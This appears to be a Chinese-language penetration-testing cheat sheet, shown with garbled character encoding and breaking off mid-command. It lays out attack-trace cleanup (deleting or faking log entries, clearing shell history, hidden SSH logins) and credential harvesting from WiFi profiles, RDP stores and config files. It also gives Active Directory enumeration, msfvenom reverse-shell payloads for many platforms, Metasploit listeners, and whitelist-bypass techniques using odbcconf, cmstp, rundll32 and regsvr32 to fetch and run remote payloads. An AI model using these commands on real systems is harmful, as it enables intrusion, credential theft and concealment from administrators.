æ—¥å¿—æ–‡ä»¶å…¨éƒ¨è¢«æ¸…ç©ºï¼Œå¤ªå®¹æ˜“è¢«ç®¡ç†å‘˜å¯Ÿè§‰äº†ï¼Œå¦‚æœåªæ˜¯åˆ é™¤æˆ–æ›¿æ¢éƒ¨åˆ†å…³é”®æ—¥å¿—ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œç¾éšè—æ”»å‡»ç—•è¿¹ã€‚

```bash
# åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip
sed  -i '/è‡ªå·±çš„ip/'d  /var/log/messages

# å…¨å±€æ›¿æ¢ç™»å½•IPåœ°å€ï¼š
sed -i 's/192.168.166.85/192.168.1.1/g' secure
```

**ç¬¬ä¸‰ç§æ–¹å¼ï¼šwebæ—¥å¿—**

**ç›´æ¥æ›¿æ¢æ—¥å¿—ipåœ°å€**

```bash
sed -i 's/192.168.166.85/192.168.1.1/g' access.log
```

**æ¸…é™¤éƒ¨åˆ†ç›¸å…³æ—¥å¿—**

```bash
# ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log
# æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶
cat tmp.log > /var/log/nginx/access.log
```

### æ°¸ä¹…æ“¦é™¤æŠ€å·§

**ï¼ˆ1ï¼‰shredå‘½ä»¤**

å®ç°å®‰å…¨çš„ä»ç¡¬ç›˜ä¸Šæ“¦é™¤æ•°æ®ï¼Œé»˜è®¤è¦†ç›–3æ¬¡ï¼Œé€šè¿‡ -næŒ‡å®šæ•°æ®è¦†ç›–æ¬¡æ•°ã€‚

```bash
[root@centos]# shred -f -u -z -v -n 8 1.txt 
shred: 1.txt: pass 1/9 (random)...
shred: 1.txt: pass 2/9 (ffffff)...
shred: 1.txt: pass 3/9 (aaaaaa)...
shred: 1.txt: pass 4/9 (random)...
shred: 1.txt: pass 5/9 (000000)...
shred: 1.txt: pass 6/9 (random)...
shred: 1.txt: pass 7/9 (555555)...
shred: 1.txt: pass 8/9 (random)...
shred: 1.txt: pass 9/9 (000000)...
shred: 1.txt: removing
shred: 1.txt: renamed to 00000
shred: 00000: renamed to 0000
shred: 0000: renamed to 000
shred: 000: renamed to 00
shred: 00: renamed to 0
shred: 1.txt: removed
```

**ï¼ˆ2ï¼‰ddå‘½ä»¤**

å¯ç”¨äºå®‰å…¨åœ°æ¸…é™¤ç¡¬ç›˜æˆ–è€…åˆ†åŒºçš„å†…å®¹ã€‚

```bash
dd if=/dev/zero of=è¦åˆ é™¤çš„æ–‡ä»¶ bs=å¤§å° count=å†™å…¥çš„æ¬¡æ•°
```

**ï¼ˆ3ï¼‰wipe**

Wipe ä½¿ç”¨ç‰¹æ®Šçš„æ¨¡å¼æ¥é‡å¤åœ°å†™æ–‡ä»¶ï¼Œä»ç£æ€§ä»‹è´¨ä¸­å®‰å…¨æ“¦é™¤æ–‡ä»¶ã€‚

```bash
wipe filename
```

**ï¼ˆ4ï¼‰Secure-Delete**

Secure-Delete æ˜¯ä¸€ç»„å·¥å…·é›†åˆï¼Œæä¾›srmã€smemã€sfillã€sswapï¼Œ4ä¸ªå®‰å…¨åˆ é™¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚

```bash
srm filenames
fill filename
sswap /dev/sda1
smem
```

### æ¸…é™¤historyè®°å½•

**ç¬¬ä¸€ç§æ–¹å¼ï¼š**

ï¼ˆ1ï¼‰ç¼–è¾‘historyè®°å½•æ–‡ä»¶ï¼Œåˆ é™¤éƒ¨åˆ†ä¸æƒ³è¢«ä¿å­˜çš„å†å²å‘½ä»¤ã€‚

```bash
vim ~/.bash_history
```

ï¼ˆ2ï¼‰æ¸…é™¤å½“å‰ç”¨æˆ·çš„historyå‘½ä»¤è®°å½•

```bash
history -c
```

**ç¬¬äºŒç§æ–¹å¼ï¼š**

ï¼ˆ1ï¼‰åˆ©ç”¨vimç‰¹æ€§åˆ é™¤å†å²å‘½ä»¤

```bash
#ä½¿ç”¨vimæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶
vi test.txt

# è®¾ç½®vimä¸è®°å½•å‘½ä»¤ï¼ŒVimä¼šå°†å‘½ä»¤å†å²è®°å½•ï¼Œä¿å­˜åœ¨viminfoæ–‡ä»¶ä¸­ã€‚
:set history=0

# ç”¨vimçš„åˆ†å±åŠŸèƒ½æ‰“å¼€å‘½ä»¤è®°å½•æ–‡ä»¶.bash_historyï¼Œç¼–è¾‘æ–‡ä»¶åˆ é™¤å†å²æ“ä½œå‘½ä»¤
vsp ~/.bash_history

# æ¸…é™¤ä¿å­˜.bash_historyæ–‡ä»¶å³å¯ã€‚
```

ï¼ˆ2ï¼‰åœ¨vimä¸­æ‰§è¡Œè‡ªå·±ä¸æƒ³è®©åˆ«äººçœ‹åˆ°çš„å‘½ä»¤

```bash
:set history=0
:!command
```

**ç¬¬ä¸‰ç§æ–¹å¼ï¼š**

é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/profileï¼Œä½¿ç³»ç»Ÿä¸å†ä¿å­˜å‘½ä»¤è®°å½•ã€‚

```bash
HISTSIZE=0
```

**ç¬¬å››ç§æ–¹å¼ï¼š**

ç™»å½•åæ‰§è¡Œä¸‹é¢å‘½ä»¤,ä¸è®°å½•å†å²å‘½ä»¤(.bash_history)

```bash
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
```

### éšè—è¿œç¨‹SSHç™»é™†è®°å½•

éšèº«ç™»å½•ç³»ç»Ÿï¼Œä¸ä¼šè¢«wã€whoã€lastç­‰æŒ‡ä»¤æ£€æµ‹åˆ°ã€‚

```bash
ssh -T root@192.168.0.1 /bin/bash -i
```

ä¸è®°å½•sshå…¬é’¥åœ¨æœ¬åœ°.sshç›®å½•ä¸­

```bash
ssh -o UserKnownHostsFile=/dev/null -T user@192.168.0.1 /bin/bash â€“i
```






# æ¨ªå‘ç§»åŠ¨

- linuxåå¼¹shellåä¿æŒä¼šè¯ä¸æ–­,å¯ä»¥å€Ÿâ½¤screenä¿æŒä¼šè¯

- æŠŠåå¼¹shellè½¬ä¸ºäº¤äº’å¼çš„shell

  ```python
  python -c 'import pty; pty.spawn("/bin/bash")' //â½£æˆpyåŠäº¤äº’å¼shell ctrl+Z
  stty raw -echo fg
  resetexport SHELL=bashexport TERM=xterm256-color stty rows 38 columns 116
  ```


## å†…ç½‘å¸¸ç”¨å‘½ä»¤

- whoami # æŸ¥çœ‹å½“å‰ç”¨æˆ·
- net user # æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·
- query user # æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·
- ipconfig /all # æŸ¥çœ‹å½“å‰ä¸»æœºçš„ä¸»æœºå/IP/DNSç­‰ä¿¡æ¯
- route print # æŸ¥çœ‹è·¯ç”±è¡¨ä¿¡æ¯
- netstat -ano # æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ
- arp -a # æŸ¥çœ‹arpè§£ææƒ…å†µ
- tasklist /svc # æŸ¥çœ‹è¿›ç¨‹åŠå¯¹åº”æœåŠ¡å
- net localgroup administrators # æŸ¥çœ‹ç®¡ç†å‘˜ç»„æˆå‘˜
- systeminfo # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å«è¡¥ä¸ä¿¡æ¯
- net use # æŸ¥çœ‹ipcè¿æ¥æƒ…å†µ
- net view # æŸ¥çœ‹åŒ¿åå…±äº«æƒ…å†µ
- netsh firewall show state # æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€
- cmdkey /l # æŸ¥çœ‹å½“å‰ä¿å­˜çš„ç™»é™†å‡­è¯

## å¯†ç æœé›†

- netsh wlan show profiles # æŸ¥çœ‹è¿æ¥è¿‡çš„wifiåç§°

- netsh wlan show profile name="wifiåç§°" key=clear # æŸ¥çœ‹wifiçš„å¯†ç 

- dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # æŸ¥çœ‹RDPè¿æ¥å‡­è¯

- dir /a /s /b "ç½‘ç«™ç›®å½•\*config*" > 1.txt # æ•°æ®åº“é…ç½®æ–‡ä»¶

- laZagne.exe all -oN # æœ¬åœ°wifi/æµè§ˆå™¨ç­‰å¯†ç 

- dir %APPDATA%\Microsoft\Windows\Recent # æŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡æ¡£

- dir /s /a \åŸŸæ§IP\SYSVOL*.xml # è·å–åŸŸé‡Œé¢æ‰€æœ‰æœºå­çš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å¯†ç 

- linuxå¯†ç å¿«é€ŸæŸ¥æ‰¾

  ```bash
  find / -name *.properties 2>/dev/null | grep WEB-INF
  
  find / -name "*.properties" | xargs egrep -i "user|pass|pwd|uname|login|db_" find / -regex ".*\.properties\|.*\.conf\|.*\.config" | xargs grep -E "=jdbc:|pass="
  
  find /webapp -regex ".*\.properties" -print 2>/dev/null | xargs grep -E "=jdbc:|rsync"
  
  find / -regex ".*\.properties" -print  2>/dev/null
  
  find / -regex ".*\.properties\|.*\.conf\|.*\.config\|.*\.sh" | xargs grep -E "=jdbc:|pass=|passwd="
  
  find / -regex ".*\.xml\|.*\.properties\|.*\.conf\|.*\.config\|.*\.jsp" | xargs grep -E "setCipherKey"
  ```

- å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯»æ‰¾åŒ…å«å¯†ç å­—æ®µçš„æ–‡ä»¶ï¼š

  `cd /webfindstr  /s /m "password" *.*`

- å¸¸ç”¨åº”ç”¨çš„é»˜è®¤é…ç½®è·¯å¾„ï¼š

  ```
  Tomcat:CATALINA_HOME/conf/tomcat-users.xml
  
  Apache:/etc/httpd/conf/httpd.conf
  
  Nginx:/etc/nginx/nginx.conf
  
  Wdcp:/www/wdlinux/wdcp/conf/mrpw.conf
  
  Mysql:mysql\data\mysql\user.MYD
  ```




## æ–‡ä»¶æŸ¥æ‰¾

https://www.anquanke.com/post/id/245019



æ–‡ä»¶æŸ¥æ‰¾ï¼š

**Windows**

```
for /r C: %i in (login.*) do @echo %i

where /R C: login.*

dir /s/a-d/b login.*
```

**Linux**

```
find / -name index.php

updatedb && locate index.php
```

æºç æŸ¥æ‰¾

**Windows**

```
findstr /s /i /n /d:C:\ /c:"123123" *.txt
```

å…¶ä¸­/d:æ˜¯æŒ‡å®šç›®å½•ï¼Œåœ¨windowsä¸­ä¸€èˆ¬ä¸ºæŒ‡å®šç›˜ç¬¦ï¼Œ/c:åˆ™æ˜¯æŒ‡å®šæ–‡ä»¶å†…å®¹ï¼Œæœ€åæŒ‡å®šçš„æ˜¯æ–‡ä»¶åå­—ã€‚

**ï¼ˆbï¼‰Linux**

```
find / -name "index.php" | xargs grep "111222"
```












## è¿é€šæ€§

- ping [www.baidu.com](http://www.baidu.com/) # ICMPè¿é€šæ€§
- nslookup [www.baidu.com](http://www.baidu.com/) # DNSè¿é€šæ€§
- curl [https://www.baidu.com](https://www.baidu.com/) # httpè¿é€šæ€§
- nc ip port # TCPè¿é€šæ€§

# åŸŸä¿¡æ¯æ”¶é›†

## å¸¸ç”¨ä¿¡æ¯æ”¶é›†

- net config workstation #æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ
- net user /domain # è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨
- net view /domain # æŸ¥çœ‹æ‰€æœ‰çš„åŸŸ
- net view /domain:XXX # æŸ¥çœ‹è¯¥åŸŸå†…æ‰€æœ‰ä¸»æœº
- net group /domain # æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·ç»„åˆ—è¡¨
- net group "domain computers" /domain # æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå
- net group "domain admins" /domain # æŸ¥çœ‹æ‰€æœ‰åŸŸç®¡ç†å‘˜
- net group "domain controllers" /domain # æŸ¥çœ‹æ‰€æœ‰åŸŸæ§åˆ¶å™¨
- net group "enterprise admins" /domain # æŸ¥çœ‹æ‰€æœ‰ä¼ä¸šç®¡ç†å‘˜
- nltest /domain_trusts # è·å–åŸŸä¿¡ä»»ä¿¡æ¯
- net time /domain # æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ
- net accounts /domain # æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥
- dsquery server # å¯»æ‰¾ç›®å½•ä¸­çš„åŸŸæ§åˆ¶å™¨
- netdom query pdc # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºå
- wmic useraccount get /all #è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯

## ç¯å¢ƒä¿¡æ¯æœé›†

- nbtscan.exe xx.xx.xx.xx/24 # æŸ¥çœ‹cæ®µæœºå™¨
- csvde.exe -f 1.csv -k # æ‰¹é‡å¯¼å…¥/å¯¼å‡ºADç”¨æˆ·
- setspn.exe -T xx.xx.xx.xx -Q */* # æŸ¥çœ‹å½“å‰åŸŸå†…æ‰€æœ‰spn





# å†…ç½‘æ¸—é€åˆé›†

æ‰‹æŠŠæ‰‹æ•™ä½ å…¥é—¨å†…ç½‘æ¸—é€ä¹‹ä¸€

1. ä¿¡æ¯æœé›†+å†…ç½‘ææƒ+éš§é“æ­å»º

https://www.anquanke.com/post/id/221264

æ‰‹æŠŠæ‰‹æ•™ä½ å…¥é—¨å†…ç½‘æ¸—é€ä¹‹äºŒ

1. å†…ç½‘æ¨ªå‘ç§»åŠ¨

https://www.anquanke.com/post/id/222269

æ‰‹æŠŠæ‰‹æ•™ä½ å…¥é—¨å†…ç½‘æ¸—é€ä¹‹ä¸‰

1. æŒä¹…åŒ–æ§åˆ¶ï¼šåé—¨+å…æ€

https://www.anquanke.com/post/id/223095



# payloadç”Ÿæˆ

windows:

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o
payload.exe
```

mac:

 ```
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=æ”»å‡»æœºIP
LPORT=æ”»å‡»æœºç«¯å£ -f macho -o payload.macho
 ```

android:

```
//éœ€è¦ç­¾å
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=æ”»
å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f apk -o payload.apk
```

powershell:

  ```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=
æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
  ```

linux:
```bash 
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=æ”»
å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f elf -o payload.elf
```

php:

```bash 
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=
<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >>
shell.php
```

aspx:

```bash 
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=
æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f aspx -o payload.aspx
```

jsp:

```bash 
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»
å‡»æœºç«¯å£ -f raw -o payload.jsp ```
```

war:
```bash 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -
o payload.war
```
nodejs:
```bash 
msfvenom -p nodejs/shell_reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -o
payload.js
```
python:
```bash 
msfvenom -p python/meterpreter/reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -
f raw -o payload.py
```
perl:
```bash 
msfvenom -p cmd/unix/reverse_perl LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -o
payload.pl
```
ruby:
```bash 
msfvenom -p ruby/shell_reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -o
payload.rb
```
lua:
```bash 
msfvenom -p cmd/unix/reverse_lua LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -o
payload.lua
```
windows shellcode:
```bash 
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f c
```
linux shellcode:
```bash 
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=æ”»
å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f c
```



# payloadä¸‹è½½&ç™½åå•bypass



å‚è€ƒï¼š

https://xz.aliyun.com/t/5768 æ¸—é€æµ‹è¯•ä¸­å¼¹shellçš„å¤šç§æ–¹å¼åŠbypass

https://micro8.gitbook.io/micro8/ å¤§ä½¬ç»éªŒåå¹´æ€»ç»“



## pythonæ–‡ä»¶æœåŠ¡å™¨

```
python2 -m SimpleHTTPServer 8081

python3 -m http.server 8081
```





**å¦‚æœæ˜¯å•çº¯çš„ä¸‹è½½payloadæ¨èä½¿ç”¨powershellæˆ–certutilè¿›è¡Œä¸‹è½½ï¼Œä½†æ˜¯è®°å¾—æ¸…ç†ç¼“å­˜**

## ftp

**ä¸‹è½½å§¿åŠ¿**

```bash
echo open 192.168.1.1 21> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo ftp>> ftp.txt
echo GET 1.exe >> ftp.txt
ftp -s:ftp.txt
```

éœ€è¦æ­å»ºftpæœåŠ¡å™¨ï¼Œç”¨ftpä¸‹è½½é˜²ç«å¢™ä¼šå¼¹æ¡†æ‹¦æˆªï¼Œä½¿ç”¨å‰è®°å¾—è¦å…ˆæ·»åŠ é˜²ç«å¢™è§„åˆ™

**msfæ”»å‡»**

msfå¯ç”¨ç›‘å¬

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) > set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/bdf2a4380b78457aa0a59504fe516d04)

ç”Ÿæˆpayload

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse\_tcp LHOST= 192.168.43.231 LPORT=53 -e x86/shikata\_ga_nai -b '\\\x00\\\x0a\\\xff' -i 3 -f exe -o payload.exe
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/84c115a3f22e43e49cc9b108e7dee7be)

é¶æœºæ‰§è¡Œ(payloadä¼ åˆ°é¶æœºä¸Š)

```
echo !C:\\payload.exe > o &&echo quit >> o &Ftp â€n â€s:o &&del /F /Q o
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/042bd6f0a9954246a3fdc9b6ee52003a)



## ODBCCONFåˆ©ç”¨dll

ODBCCONF.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå…è®¸é…ç½®ODBCé©±åŠ¨ç¨‹åºå’Œæ•°æ®

è¯´æ˜ï¼šOdbcconf.exeæ‰€åœ¨è·¯å¾„å·²è¢«ç³»ç»Ÿæ·»åŠ PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤ï¼ŒOdbcconfå‘½ä»¤å¯è¯†

åˆ«ï¼Œéœ€æ³¨æ„x86ï¼Œx64ä½çš„Odbcconfè°ƒç”¨ã€‚

Windows 2003 é»˜è®¤ä½ç½®ï¼š

C:\WINDOWS\system32\odbcconf.exe

C:\WINDOWS\SysWOW64\odbcconf.exe

Windows 7 é»˜è®¤ä½ç½®ï¼š

C:\Windows\System32\odbcconf.exe

C:\Windows\SysWOW64\odbcconf.exe

msfå¯ç”¨ç›‘å¬

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) >  set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

ç”Ÿæˆdll

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 92.168.43.231 LPORT=53  -f dll -o payload.dll
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/bdb5e9edd33d46a6a836ddd745b74eb1)

é¶æœºæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼ˆæ³¨æ„payloadç‰ˆæœ¬ï¼‰

```
odbcconf.exe /a {regsvr C:\\payload.dll}
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/642120c5e5a247c2ae577528163ba5b7)

## cmstpåˆ©ç”¨dll

Cmstpå®‰è£…æˆ–åˆ é™¤â€œè¿æ¥ç®¡ç†å™¨â€æœåŠ¡é…ç½®æ–‡ä»¶ã€‚å¦‚æœä¸å«å¯é€‰å‚æ•°çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œåˆ™

cmstp ä¼šä½¿ç”¨å¯¹åº”äºæ“ä½œç³»ç»Ÿå’Œç”¨æˆ·çš„æƒé™çš„é»˜è®¤è®¾ç½®æ¥å®‰è£…æœåŠ¡é…ç½®æ–‡ä»¶ã€‚

è¯´æ˜ï¼šCmstp.exeæ‰€åœ¨è·¯å¾„å·²è¢«ç³»ç»Ÿæ·»åŠ PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤ï¼ŒCmstpå‘½ä»¤å¯è¯†åˆ«ï¼Œéœ€

æ³¨æ„x86ï¼Œx64ä½çš„Cmstpè°ƒç”¨ã€‚

Windows 2003 é»˜è®¤ä½ç½®ï¼š

C:\Windows\System32\cmstp.exe

C:\Windows\SysWOW64\cmstp.exe

Windows 7 é»˜è®¤ä½ç½®ï¼š

C:\Windows\System32\cmstp.exe

C:\Windows\SysWOW64\cmstp.exe

msfå¯ç”¨ç›‘å¬

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) >  set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

å‡†å¤‡infæ–‡ä»¶ï¼Œä»¥ä¸‹æ˜¯æ¨¡æ¿

```
[version]
 Signature=$chicago$
 AdvancedINF=2.5
[DefaultInstall_SingleUser]
 RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
 C:\payload.dll
[Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager" 
 ServiceName="safe6" 
 ShortSvcName="safe6"
```

INF æ–‡ä»¶çš„ RegisterOCXSection éœ€è¦åŒ…å«æ¶æ„ DLL æ–‡ä»¶çš„æœ¬åœ°è·¯å¾„æˆ–è¿œç¨‹æ‰§è¡Œçš„ WebDAV ä½ç½®

ç„¶åå†é¶æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤

```
cmstp /s safe6.inf
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸‹ï¼‰](img/3085efce68554bb1a68a554107a74231)



## Rundll

Rundll32.exeä¸Windowsæ“ä½œç³»ç»Ÿç›¸å…³è”ï¼ŒRundll32.exeå¯è°ƒç”¨ä»DLLå¯¼å‡ºçš„å‡½æ•°ï¼ˆ16ä½æˆ–32ä½ï¼‰å¹¶å°†å…¶å­˜å‚¨åœ¨ç‰¹å®šçš„å†…å­˜åº“ä¸­ã€‚

é€šè¿‡SMBäº¤ä»˜Metasploitå‘èµ·Rundll32æ”»å‡»

MetasploitåŒ…å«â€œ SMB Deliveryâ€æ¨¡å—ï¼Œè¯¥æ¨¡å—ç”Ÿæˆæ¶æ„çš„dllæ–‡ä»¶ã€‚ è¯¥æ¨¡å—é€šè¿‡SMBæœåŠ¡å™¨æä¾›æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶æä¾›æ§åˆ¶å‘½ä»¤ã€‚ å½“å‰æ”¯æŒDLLå’ŒPowershellã€‚

```
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) > exploit
```

ä¸‹é¢é€šè¿‡Rundll32.exeå‘½ä»¤è·å¾—meterpreterä¼šè¯ã€‚

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/c125051f16bc49c29da567e9dc6cf96d)

åœ¨å—æ§æœºå™¨ä¸Šè¿œç¨‹æ‰§è¡Œæ¶æ„dll,ä½ å°†è·å¾—å—æ§è®¡ç®—æœºçš„åå‘shellã€‚

```
rundll32.exe \\\192.168.1.109\\vabFG\\test.dll,0
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/a1e6033798d64d1c9e098e5e4416d5b8)

è·å¾—meterpreterä¼šè¯å¦‚ä¸‹ï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/63e9268f2dbf4a9c867b7682a1a21054)



## Regsvr32

Regsvr32.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œç”¨äºæ³¨å†Œå’Œæ³¨é”€OLEæ§ä»¶ï¼Œä¾‹å¦‚Windowsæ³¨å†Œè¡¨ä¸­çš„DLLå’ŒActiveXæ§ä»¶ã€‚Regsvr32.exeå®‰è£…åœ¨Windows XPå’ŒWindowsæ›´é«˜ç‰ˆæœ¬çš„ï¼…systemrootï¼…\ System32æ–‡ä»¶å¤¹ä¸‹ã€‚

```
RegSvr32.exeå…·æœ‰ä»¥ä¸‹å‘½ä»¤è¡Œé€‰é¡¹ï¼š
è¯­æ³•ï¼šRegsvr32 [/s] [/ u] \[/ n] \[/ i [ï¼šcmdline\]\]<dllname>            
 / u â€“æ³¨é”€æœåŠ¡å™¨            
 / i â€“è°ƒç”¨DllInstallï¼Œå¹¶ä¸ºå…¶ä¼ é€’å¯é€‰çš„\[cmdline\]ï¼›     ä¸/ uä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå®ƒå°†è°ƒç”¨dllè¿›è¡Œå¸è½½         
/ n â€“ä¸è°ƒç”¨DllRegisterServerï¼›æ­¤é€‰é¡¹å¿…é¡»ä¸
/ iä¸€èµ·ä½¿ç”¨
/ s â€“é™éŸ³ï¼›ä¸æ˜¾ç¤ºæ¶ˆæ¯æ¡†
```

é€šè¿‡Metasploitçš„è„šæœ¬Webäº¤ä»˜å¯åŠ¨Regsvr32

æ­¤æ¨¡å—å¯å¿«é€Ÿå¯åŠ¨æä¾›æœ‰æ•ˆè´Ÿè½½çš„WebæœåŠ¡å™¨ã€‚æä¾›çš„å‘½ä»¤å°†å…è®¸æœ‰æ•ˆè´Ÿè½½ä¸‹è½½å¹¶æ‰§è¡Œã€‚å®ƒå°†é€šè¿‡regsvr32.exeæ¥æŒ‡å®šè„šæœ¬è¯­è¨€è§£é‡Šå™¨æˆ–â€œ squibledooâ€æ¥ç»•è¿‡åº”ç”¨ç¨‹åºç™½åå•ã€‚è¯¥æ¨¡å—çš„ä¸»è¦ç›®çš„æ˜¯åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šå¿«é€Ÿå»ºç«‹ä¼šè¯ã€‚

Regsvr32ä½¿ç”¨squiblydooæŠ€æœ¯ç»•è¿‡åº”ç”¨ç¨‹åºç™½åå•ã€‚ç­¾åçš„MicrosoftäºŒè¿›åˆ¶æ–‡ä»¶Regsvr32èƒ½å¤Ÿè¿è¡Œ.sctæ–‡ä»¶ï¼Œç„¶ååœ¨å…¶ä¸­æ‰§è¡ŒåŒ…å«PowerShellå‘½ä»¤ã€‚ä¸¤ä¸ªWebè¯·æ±‚ï¼ˆå³.sctæ–‡ä»¶å’ŒPowerShellä¸‹è½½/æ‰§è¡Œï¼‰éƒ½å¯ä»¥åœ¨åŒä¸€ç«¯å£ä¸Šæ‰§è¡Œã€‚â€œPSHï¼ˆBinaryï¼‰â€ä¼šå°†æ–‡ä»¶å†™å…¥åˆ°ç¡¬ç›˜ä¸­ï¼Œå…è®¸è‡ªå®šä¹‰äºŒè¿›åˆ¶æ–‡ä»¶è¢«ä¸‹è½½å’Œæ‰§è¡Œã€‚

```
use exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target 3
msf exploit (web_delivery)> set payloadphp/meterpreter/reverse\_tcp
msf exploit (web_delivery)> set lhost192.168.1.109
msf exploit (web_delivery)>set srvhost192.168.1.109
